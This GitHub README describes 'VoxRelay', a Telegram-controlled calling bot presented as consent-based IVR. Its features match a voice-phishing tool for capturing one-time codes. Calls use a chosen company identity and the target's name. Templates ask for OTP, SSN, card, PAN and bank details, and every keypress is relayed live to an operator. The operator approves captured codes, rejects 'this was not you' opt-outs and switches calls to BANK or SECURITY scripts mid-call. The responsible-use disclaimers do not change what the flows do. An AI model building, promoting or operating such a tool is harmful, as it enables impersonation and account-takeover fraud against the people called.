<div align="center">

<img src="https://github.com/anon-dc/VoxRelay/main/docs/banner.svg" alt="VoxRelay" width="820">

<br><br>

<a href="https://github.com/anon-dc/voxrelay/stargazers">
  <img src="https://img.shields.io/github/stars/anon-dc/voxrelay?style=for-the-badge&logo=github&logoColor=white&labelColor=0b0f17&color=4f8ef7" alt="GitHub Stars">
</a>
<a href="https://github.com/anon-dc/voxrelay/network/members">
  <img src="https://img.shields.io/github/forks/anon-dc/voxrelay?style=for-the-badge&logo=github&logoColor=white&labelColor=0b0f17&color=4f8ef7" alt="GitHub Forks">
</a>
<a href="https://github.com/anon-dc/voxrelay/issues">
  <img src="https://img.shields.io/github/issues/anon-dc/voxrelay?style=for-the-badge&logo=github&logoColor=white&labelColor=0b0f17&color=4f8ef7" alt="GitHub Issues">
</a>
<a href="https://github.com/anon-dc/voxrelay/blob/main/LICENSE">
  <img src="https://img.shields.io/github/license/anon-dc/voxrelay?style=for-the-badge&logo=github&logoColor=white&labelColor=0b0f17&color=4f8ef7" alt="License">
</a>

<br>

<img src="https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
<img src="https://img.shields.io/badge/Flask-3.x-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
<img src="https://img.shields.io/badge/Twilio-Voice-F22F46?style=for-the-badge&logo=twilio&logoColor=white" alt="Twilio">
<img src="https://img.shields.io/badge/Telegram-Bot-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
<img src="https://img.shields.io/badge/SQLite-WAL-003B57?style=for-the-badge&logo=sqlite&logoColor=white" alt="SQLite">
<img src="https://img.shields.io/badge/AMD-Enabled-4f8ef7?style=for-the-badge&logo=twilio&logoColor=white" alt="AMD Enabled">

<br><br>

<h1>VoxRelay</h1>

<h3>Telegram-controlled IVR & communications automation</h3>

<p>
Build, manage and monitor consent-based voice and messaging workflows
from a centralized Telegram interface — with live operator approval,
Answering Machine Detection, and full audit trails.
</p>

<p>
  <a href="#features">Features</a> ·
  <a href="#architecture">Architecture</a> ·
  <a href="#quick-start">Quick Start</a> ·
  <a href="#configuration">Configuration</a> ·
  <a href="#api-endpoints">API</a> ·
  <a href="#deployment">Deployment</a> ·
  <a href="#security">Security</a>
</p>

<br>

**Developed by [DCWURLD](https://www.dcwurld.com)**

</div>

---

## Overview

**VoxRelay** is a Flask-based communications automation platform that connects
Telegram-based operator workflows with programmable voice and messaging
services.

It provides a centralized interface for:

- Outbound voice workflows
- Programmable IVR menus
- Live call status monitoring (ringing, answered, voicemail, ended)
- DTMF event handling with per-keystroke Telegram notifications
- Live **Approve / Reject** verification holds
- Answering Machine Detection (AMD) for verify/security scripts
- SMS delivery through Telnyx, MSG91, and GTX
- Template-based call scripts with placeholder substitution
- Operator approval workflows
- Campaign history and recording metadata
- Administrative controls
- Health monitoring

VoxRelay is designed for **authorized, consent-based communications**.
Operators are responsible for complying with applicable telecommunications,
privacy, recording-consent, anti-spam and data-protection requirements.

---

## Features

<table>
<tr>
<td width="50%" valign="top">

### Voice Automation

- Initiate outbound calls from Telegram
- Programmable IVR workflows
- TwiML-based call scripts
- DTMF menu handling with per-key notifications
- Real-time call status (ringing, answered, ended)
- Answering Machine Detection support
- Voicemail / Fax detection
- Recording status and metadata
- Configurable caller experience
- Call lifecycle tracking

</td>
<td width="50%" valign="top">

### Live Verification

- Per-keypress logging to Telegram
- **Approve / Reject** buttons on live calls
- Switch to a different template mid-call
- Two-stage SECURITY flow
- Opt-out gate — *"If this was not you, press 1"*
- Approve or reject opt-out requests in real time
- Retry caps so calls never loop forever
- Live calls held open up to 10 minutes
- Attempt counter per call

</td>
</tr>

<tr>
<td width="50%" valign="top">

### Messaging

- SMS workflow support
- Multi-provider abstraction (Telnyx · MSG91 · GTX)
- Message templates with placeholder substitution
- Delivery status tracking
- Campaign history
- Configurable sender information
- Preview + confirmation step in Telegram

</td>
<td width="50%" valign="top">

### Administration

- Telegram-based control panel
- Manage Telegram users
- Upload and manage call templates
- Configure company information
- Configure voice settings
- Configure recording notices
- Review recent campaigns
- Fetch recordings by Call SID
- Application health endpoint

</td>
</tr>
</table>

---

## Architecture

<div align="center">

<img src="https://github.com/anon-dc/VoxRelay/blob/main/docs/architecture.svg" alt="VoxRelay Architecture" width="820">

</div>

### High-level flow

```text
┌─────────────────────────────┐
│      Telegram Operator      │
└──────────────┬──────────────┘
               │
               │ Telegram Bot API
               ▼
┌─────────────────────────────────────────────┐
│                 VoxRelay                    │
│                                             │
│  Telegram Bot          Notifications        │
│  Workflow Engine       Template Engine      │
│  IVR / Voice Webhooks  Administration       │
│  Messaging Providers   Call State           │
│                                             │
└──────────────┬──────────────────────────────┘
               │
       ┌───────┴────────┐
       │                │
       ▼                ▼
┌──────────────┐  ┌──────────────┐
│ Voice        │  │ Messaging    │
│ Provider     │  │ Provider     │
│ (Twilio)     │  │ (Telnyx/MSG) │
└──────┬───────┘  └──────┬───────┘
       │                 │
       ▼                 ▼
  Phone Network      SMS Network

               │
               ▼
        ┌─────────────┐
        │   SQLite    │
        │    WAL      │
        └─────────────┘
```

### Module layout

VoxRelay is organized as a slim Flask entry point plus a `modules/` package.
Each module owns one concern:

| Module              | Purpose                                       |
| ------------------- | --------------------------------------------- |
| `app.py`            | Flask application entry point + blueprint wiring |
| `dbase.py`          | SQLite database operations (thread-local)     |
| `bot_core.py`       | Telegram bot initialization and messaging     |
| `flows.py`          | Telegram user and administrative workflows    |
| `verify.py`         | Verification workflows + live OTP hold        |
| `security.py`       | Two-stage SECURITY flow                       |
| `voice_webhooks.py` | Voice callbacks, IVR events, AMD handling     |
| `twiml_engine.py`   | Template loading and placeholder substitution |
| `providers.py`      | External messaging / voice provider wrappers  |
| `call_state.py`     | Per-call runtime decision state               |
| `notify.py`         | Operator notifications                        |
| `telegram_entry.py` | Telegram webhook + health/debug routes        |

---

## Project Structure

```text
voxrelay/
│
├── app.py                     # Flask entry point (~50 lines)
├── cred.py                    # Credentials (gitignored)
├── dbase.py                   # SQLite schema + queries
├── settings.ini               # Default company / voice / notice
├── requirements.txt
├── README.md
├── LICENSE
├── .gitignore
│
├── docs/
│   ├── banner.svg
│   └── architecture.svg
│
├── templates/                 # TwiML scripts (drop-in XML)
│   ├── OTP.xml                # opt-out → phone → OTP
│   ├── SECURITY.xml           # two-stage security alert
│   ├── VERIFY.xml
│   ├── PASSCODE.xml
│   ├── PHONE.xml
│   ├── SSN.xml
│   ├── ZIP.xml
│   ├── DOB.xml
│   ├── EIN.xml
│   ├── CARD.xml
│   ├── PAN.xml
│   ├── HIPAA.xml
│   ├── BANK.xml
│   ├── ACCOUNT.xml
│   ├── ORDER.xml
│   ├── LASTNAME_ZIP.xml
│   ├── APPOINTMENT.xml
│   ├── DELIVERY.xml
│   ├── PAYMENT.xml
│   ├── SURVEY.xml
│   ├── CALLBACK.xml
│   ├── REMINDER.xml
│   ├── MENU.xml
│   ├── HOLD.xml
│   └── OFFICE.xml
│
└── modules/
    ├── __init__.py
    ├── call_state.py
    ├── bot_core.py
    ├── notify.py
    ├── providers.py
    ├── twiml_engine.py
    ├── flows.py
    ├── verify.py
    ├── security.py
    ├── voice_webhooks.py
    └── telegram_entry.py
```

---

# Quick Start

## 1. Clone

```bash
git clone https://github.com/anon-dc/voxrelay.git
cd voxrelay
```

## 2. Create a virtual environment

### Linux / macOS

```bash
python3 -m venv .venv
source .venv/bin/activate
```

### Windows

```powershell
python -m venv .venv
.venv\Scripts\activate
```

## 3. Install dependencies

```bash
python -m pip install --upgrade pip
pip install -r requirements.txt
```

## 4. Configure credentials

Create a local `cred.py` file. **Never commit this file to Git.**

```python
# Voice provider (Twilio)
account_sid  = "YOUR_ACCOUNT_SID"
auth_token   = "YOUR_AUTH_TOKEN"
twilionumber = "+10000000000"

# Telegram
API_TOKEN  = "YOUR_TELEGRAM_BOT_TOKEN"
PUBLIC_URL = "https://voice.example.com"

# Telegram administrators
BOOTSTRAP_ADMINS = [
    123456789
]

# Optional messaging providers
TELNYX_API_KEY     = ""
TELNYX_FROM_NUMBER = ""

MSG91_AUTH_KEY    = ""
MSG91_SENDER_ID   = ""
MSG91_TEMPLATE_ID = ""

GTX_USER         = ""
GTX_PASS         = ""
GTX_REQUEST_URL  = ""
GTX_VERIFY_URL   = ""
```

## 5. Configure application defaults

Edit `settings.ini`:

```ini
[company]
name          = Example Company
website       = https://example.com
support_phone = +18005551212

[voice]
polly_voice = Polly.Joanna

[call]
record_notice = This call may be recorded for quality and compliance purposes.

[support]
contact       = https://www.dcwurld.com
purchase_url  = https://www.dcwurld.com
usage_url     = https://www.dcwurld.com
support_label = DCWURLD
```

## 6. Run

```bash
python app.py
```

Expose the Flask port through a reverse proxy (Caddy, nginx, or Cloudflare
Tunnel). The public HTTPS endpoint must be reachable by external providers:

```text
/telegram
/webhooks/voice/*
/health
```

---

# Telegram Workflow

A typical operator workflow is:

```text
/start
   │
   ▼
User Mode
   │
   ▼
Destination
   │
   ▼
Communication Type
   │
   ├── Voice
   │
   └── SMS
   │
   ▼
Company Identity
   │
   ▼
Client Name / Email   (Voice only)
   │
   ▼
Template / Workflow
   │
   ▼
Review
   │
   ▼
Operator Confirmation
   │
   ▼
Execution
   │
   ▼
Live Status  ←→  Approve / Reject
```

Every step offers **⬅ Back** and **✖ Cancel**. You can also type `back` or
`cancel` at any prompt, and `skip` to leave optional fields blank.

### Live OTP verification

When a caller enters a verification code, Telegram shows:

```text
🔐 Verification code entered (Step 3)
Customer entered: `123456`
Attempt #1
Client: John Smith
Email: jsmith@example.com
Company: Acme Financial

[ ✅ Approve ]   [ ❌ Reject ]
[ 📄 Switch to SECURITY ]
[ 📄 Switch to PASSCODE ]
[ 📄 Switch to HIPAA ]
[ 📄 Switch to BANK ]
```

- **✅ Approve** → the call ends with a success message
- **❌ Reject** → the caller hears "not valid, please try again" and is re-prompted
- **📄 Switch** → the live call is redirected to another template

The call is **held open** while the operator decides — up to 10 minutes.

### Opt-out hold

When a caller presses `1` at the *"If this was not you"* prompt:

```text
🚨 Not-you opt-out
Caller pressed 1 (not them)

[ ✅ Approve removal ]   [ ❌ Reject removal ]
```

- **Approve removal** → caller hears "You have been removed" and the call ends
- **Reject removal** → caller hears "please stay on the line" and verification continues

If the caller is silent at the opt-out gate, Telegram just gets an
informational note and the flow continues.

---

# IVR Templates

VoxRelay uses XML / TwiML-style templates for programmable voice workflows.
Templates live in `templates/` and are loaded by `modules/twiml_engine.py`.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{{voice}}">
        Welcome to {{company}}, {{client_name}}.
    </Say>

    <Gather numDigits="1"
            action="/webhooks/voice/menu"
            method="POST"
            timeout="6">
        <Say voice="{{voice}}">
            Press 1 to continue.
            Press 2 to speak with support.
            Press 9 to end this call.
        </Say>
    </Gather>
</Response>
```

## Supported placeholders

| Variable            | Description                                 |
| ------------------- | ------------------------------------------- |
| `{{company}}`       | Configured company name (per-call override) |
| `{{voice}}`         | Configured TTS voice                        |
| `{{record_notice}}` | Recording disclosure line                   |
| `{{website}}`       | Company website                             |
| `{{support_phone}}` | Support number                              |
| `{{client_name}}`   | Authorized client name (spoken)             |
| `{{client_email}}`  | Authorized client email (spoken as `a b at c dot com`) |

## Adding templates

Two ways:

1. **Drop a `.xml` file** into `templates/` — picked up on next restart
2. **Telegram upload** — 🛠 Admin Mode → 📄 Scripts → ➕ Upload New Script

The picker paginates 6 templates per page.

## Retry caps

Every silent-fallback step (`last4_phone_retry`, `otp_retry`, etc.) is capped
at **3 retries**. After that the call ends politely with a "please try again
later" message. This prevents infinite webhook loops if the caller never
presses anything.

## Answering Machine Detection

Scripts in this set run Twilio AMD (`DetectMessageEnd`):

```text
OTP · SECURITY · VERIFY · PASSCODE · HIPAA · BANK
```

Events pushed to Telegram:

| Event                             | Meaning              |
| --------------------------------- | -------------------- |
| `🧑 Human detected (AMD)`          | Real person answered |
| `📭 Voicemail detected (…)`        | Machine answered     |
| `📠 Fax detected`                  | Fax line             |

Non-AMD scripts use a short-call heuristic instead:

- `no-answer` → `📭 Likely voicemail (no answer)`
- `completed` with duration ≤ 6s → `📭 Possible voicemail (short call Xs)`

To enable AMD on another script, add its uppercase name to `AMD_SCRIPTS` in
both `modules/flows.py` and `modules/voice_webhooks.py`.

Avoid placing passwords, payment-card data, authentication secrets, or other
unnecessary sensitive information into templates or application logs.

---

# DTMF & IVR Events

VoxRelay can process DTMF input from supported voice providers and forward
each keypress to Telegram in real time.

Example:

```text
Incoming IVR event
       │
       ▼
DTMF received
       │
       ├── 1 → Continue
       ├── 2 → Support
       ├── 3 → Repeat
       └── 9 → Exit
       │
       ▼
Telegram notification:
   🔢 Step 2 on VERIFY
   Customer pressed: `1`
```

---

# Messaging

Provider integrations are configured through the provider abstraction layer
in `modules/providers.py`.

Supported integrations:

```text
Telnyx
MSG91
GTX
```

The provider layer maintains a consistent internal interface while
provider-specific API calls remain isolated.

```text
Telegram
   │
   ▼
VoxRelay
   │
   ▼
Provider abstraction
   │
   ├── Telnyx
   ├── MSG91
   └── GTX
```

---

# API Endpoints

| Method | Endpoint                             | Description                     |
| ------ | ------------------------------------ | ------------------------------- |
| `POST` | `/telegram`                          | Telegram webhook                |
| `POST` | `/webhooks/voice/play/<script>`      | Serve voice template            |
| `POST` | `/webhooks/voice/gather`             | Generic DTMF handler            |
| `POST` | `/webhooks/voice/menu`               | IVR menu handler                |
| `POST` | `/webhooks/voice/status`             | Voice status callback (AMD)     |
| `POST` | `/webhooks/voice/verify/*`           | Verification workflow           |
| `POST` | `/webhooks/voice/verify/otp`         | OTP live hold (Approve / Reject)|
| `POST` | `/webhooks/voice/verify/security_*`  | Two-stage SECURITY flow         |
| `GET`  | `/health`                            | Application health              |
| `GET`  | `/debug/traffic`                     | Development traffic information |
| `GET`  | `/debug/calls`                       | Development call state          |

> **Production warning:** Do not expose `/debug/*` publicly without
> authentication and access controls.

---

# Database

VoxRelay uses SQLite in **WAL** mode with **thread-local connections**. Each
thread (Flask request, Telegram worker, background sweeper) gets its own
connection via `get_conn()` in `dbase.py` — no shared cursors, no
`Recursive use of cursors` errors.

Typical application tables:

| Table            | Purpose                        |
| ---------------- | ------------------------------ |
| `Users`          | Telegram users and roles       |
| `Scripts`        | Stored communication templates |
| `Campaigns`      | Communication history          |
| `OtpRequests`    | OTP request tracking           |
| `UserDefaults`   | User-specific defaults         |
| `VerifySessions` | Verification workflow state    |
| `VerifyAudit`    | Verification audit events      |
| `PendingFlow`    | Active Telegram workflows      |
| `CallContext`    | Call runtime metadata (company, client, owner) |

---

# Security

Security should be treated as a deployment requirement, not an optional
feature.

## Credentials

Never commit:

```text
cred.py
.env
UserDetails.db
UserDetails.db-wal
UserDetails.db-shm
*.sqlite
*.sqlite3
```

Use environment variables or a protected secrets manager for production
credentials.

## Telegram

Configure a Telegram webhook secret and validate:

```text
X-Telegram-Bot-Api-Secret-Token
```

## Voice Webhooks

Validate provider webhook signatures before processing requests.

For Twilio integrations, validate:

```text
X-Twilio-Signature
```

using the configured authentication credentials.

## HTTPS

Always expose production webhooks through HTTPS.

Recommended:

```text
Internet
    │
    ▼
HTTPS Reverse Proxy
    │
    ▼
VoxRelay
    │
    ▼
127.0.0.1:5000
```

## Sensitive Data

Do not unnecessarily collect, store, transmit, or log:

- Passwords
- Full payment-card numbers
- CVV / security codes
- Full Social Security numbers
- Full government identification numbers
- Authentication secrets
- Private API keys

VoxRelay's templates and flows are designed to use only **last-4** identifiers
and **short-lived hosted verification references** wherever identity
confirmation is needed.

---

# Compliance & Responsible Use

VoxRelay is intended for **authorized communications and legitimate business
workflows**.

Operators are responsible for:

- Obtaining appropriate consent before contacting recipients
- Following applicable telecommunications regulations
- Respecting do-not-call requirements
- Providing required recording disclosures
- Respecting SMS opt-out requirements
- Protecting customer information
- Maintaining appropriate access controls
- Using provider APIs according to their terms
- Obtaining authorization before automating communications

VoxRelay should **not** be used for impersonation, phishing, credential theft,
unauthorized account verification, harassment, spam, or fraudulent activity.

---

# Deployment

A recommended production architecture:

```text
                 Internet
                    │
                    ▼
          ┌──────────────────┐
          │ Cloudflare / CDN │
          └─────────┬────────┘
                    │ HTTPS
                    ▼
          ┌──────────────────┐
          │ Caddy / nginx    │
          └─────────┬────────┘
                    │
                    ▼
          ┌──────────────────┐
          │    VoxRelay      │
          │     Flask        │
          └─────────┬────────┘
                    │
             ┌──────┴──────┐
             ▼             ▼
          SQLite       Providers
```

## Ubuntu

```bash
sudo mkdir -p /opt/voxrelay
sudo chown $USER:$USER /opt/voxrelay

git clone https://github.com/anon-dc/voxrelay.git /opt/voxrelay

cd /opt/voxrelay

python3 -m venv .venv
source .venv/bin/activate

pip install --upgrade pip
pip install -r requirements.txt
```

---

# systemd

Example service:

```ini
[Unit]
Description=VoxRelay Communications Service
After=network.target

[Service]
Type=simple
User=voxrelay
WorkingDirectory=/opt/voxrelay
Environment="PYTHONUNBUFFERED=1"
ExecStart=/opt/voxrelay/.venv/bin/python app.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

Enable it:

```bash
sudo systemctl daemon-reload
sudo systemctl enable voxrelay
sudo systemctl start voxrelay
```

Check status:

```bash
sudo systemctl status voxrelay
```

View logs:

```bash
sudo journalctl -u voxrelay -f
```

> ℹ️ `call_state.py` is in-memory. Run **one** worker process unless you
> migrate state to Redis.

---

# Scaling

The default call state implementation is process-local.

```text
call_state.py
      │
      ▼
In-memory state
```

For multiple workers or multiple servers, migrate shared runtime state to a
distributed backend such as Redis.

Recommended future architecture:

```text
                 Load Balancer
                       │
          ┌────────────┼────────────┐
          ▼            ▼            ▼
       Worker 1     Worker 2     Worker 3
          │            │            │
          └────────────┼────────────┘
                       ▼
                     Redis
                       │
                       ▼
                    SQLite /
                   PostgreSQL
```

---

# Troubleshooting

### Bot does not respond

Check:

```text
PUBLIC_URL
Telegram webhook
Bot token
HTTPS certificate
Application logs
```

Verify the application is reachable:

```bash
curl https://your-domain.example.com/health
```

### `Recursive use of cursors not allowed`

You're on an old `dbase.py`. Use the thread-local connection version — each
thread gets its own SQLite connection via `get_conn()`.

### `AttributeError: 'Blueprint' object has no attribute 'response_class'`

You're on an older modular build. Inside a blueprint, use
`flask.Response(str(body), mimetype="application/xml")` — not
`blueprint.response_class`. The current modules use a local `_xml()` helper.

### Infinite retry loop — provider hits the same endpoint for hours

The caller never entered anything and the retry loop had no upper bound.
The current `verify.py` caps every silent retry at `MAX_STEP_RETRIES = 3`
before ending the call politely.

### Calls fail immediately

Check:

```text
Voice provider credentials
Configured caller ID
Provider account permissions
HTTPS webhook URL
TwiML response
Application logs
```

### No call status updates

Verify that the provider can reach:

```text
/webhooks/voice/status
```

and inspect application logs for webhook errors.

### AMD never fires

- Confirm the script name is in `AMD_SCRIPTS` (uppercase) in
  `modules/flows.py` and `modules/voice_webhooks.py`
- Confirm `machine_detection="DetectMessageEnd"` is passed to
  `twilio_client.calls.create`
- AMD adds ~1–3 seconds of detection delay before the TwiML starts — this
  is expected

### DTMF events are missing

Verify:

- The `<Gather>` action URL
- HTTP method
- Provider webhook configuration
- DTMF configuration
- Application logs

### SQLite locking problems

Ensure the application uses the thread-local WAL configuration in
`dbase.py`, and avoid multiple unrelated processes writing to the same
SQLite database.

---

# Development

```bash
git clone https://github.com/anon-dc/voxrelay.git
cd voxrelay

python -m venv .venv

# Linux / macOS
source .venv/bin/activate

# Windows
.venv\Scripts\activate

pip install -r requirements.txt
python app.py
```

---

# Requirements

Example `requirements.txt`:

```text
Flask>=3.0,<4
pyTelegramBotAPI>=4.14
twilio>=9.0
requests>=2.31
bcrypt>=4.1
```

Pin exact versions for production after testing your environment.

---

# .gitignore

Use at least:

```gitignore
# Python
__pycache__/
*.py[cod]
*.pyo
*.pyd

# Virtual environments
.venv/
venv/
env/

# Environment / secrets
.env
.env.*
cred.py

# Databases
UserDetails.db
UserDetails.db-*
*.sqlite
*.sqlite3

# Logs
*.log
logs/

# IDE
.vscode/
.idea/

# OS
.DS_Store
Thumbs.db

# Test / coverage
.pytest_cache/
.coverage
htmlcov/

# Local configuration
settings.local.ini
```

---

# Roadmap

Potential future improvements:

- [ ] PostgreSQL support
- [ ] Redis call-state backend
- [ ] Role-based permissions
- [ ] Web administration dashboard
- [ ] Provider health dashboard
- [ ] Structured audit logging
- [ ] Webhook signature middleware
- [ ] Improved campaign analytics
- [ ] Background task queue
- [ ] Docker deployment
- [ ] Automated test suite
- [ ] Provider failover
- [ ] Multi-tenant configuration
- [ ] Improved observability
- [ ] OpenTelemetry integration

---

# Contributing

Contributions are welcome.

Before submitting a pull request:

1. Create a feature branch.
2. Keep credentials and production data out of commits.
3. Test changes locally.
4. Update documentation when behavior changes.
5. Add tests for new functionality where practical.
6. Keep provider-specific functionality isolated.
7. Do not introduce functionality designed to bypass consent,
   authentication, or provider safeguards.

Open an issue for bugs, feature requests, or architectural discussions.

---

# License

This project is distributed under the license included in:

[`LICENSE`](https://github.com/anon-dc/voxrelay/blob/main/LICENSE)

Review the license before using or redistributing the software.

---

# Support

<div align="center">

<a href="https://www.dcwurld.com">
  <img src="https://img.shields.io/badge/DCWURLD-Website-4f8ef7?style=for-the-badge&logo=googlechrome&logoColor=white" alt="DCWURLD Website">
</a>

<a href="https://github.com/anon-dc/voxrelay/issues">
  <img src="https://img.shields.io/badge/GitHub-Issues-181717?style=for-the-badge&logo=github&logoColor=white" alt="GitHub Issues">
</a>

<br><br>

<strong>VoxRelay</strong><br>
Communications automation by <strong>DCWURLD</strong>.

<br><br>

<a href="https://www.dcwurld.com">www.dcwurld.com</a>

</div>
